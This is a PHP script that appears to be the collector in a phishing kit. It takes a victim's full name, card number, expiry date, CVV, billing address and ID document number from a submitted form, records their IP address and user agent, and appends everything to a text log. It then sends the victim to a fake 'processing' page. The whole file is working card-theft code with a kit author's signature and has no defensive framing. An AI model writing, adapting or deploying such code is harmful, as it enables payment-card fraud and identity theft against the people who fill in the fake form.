<?php

if (isset($_POST['btn2'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	

	$message .= "fullName           : ".$_POST['fullName']."\n";
	$message .= "cardNumber          : ".$_POST['cardNumber']."\n";
	$message .= "expiryDate           : ".$_POST['expiryDate']."\n";
	$message .= "cvv          : ".$_POST['cvv']."\n";

	
	
	$message .= "direccion           : ".$_POST['billingAddress1']."\n";
	$message .= "estado             : ".$_POST['billingState']."\n";
	$message .= "ciudad            : ".$_POST['billingPostCode']."\n";
	$message .= "pais             : ".$_POST['billingCountry']."\n";
	$message .= "documento             : ".$_POST['doc']."\n";



	
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- Edited bY Sc4rfac3 --------------|\n";

	
	$save=fopen("access/login.txt","a+");
	          fwrite($save,$message);
	          fclose($save);

	          $discoverbank = [
              'text' => $message
              ]; 

		header("Location: ./procesando.html");

	
}

?>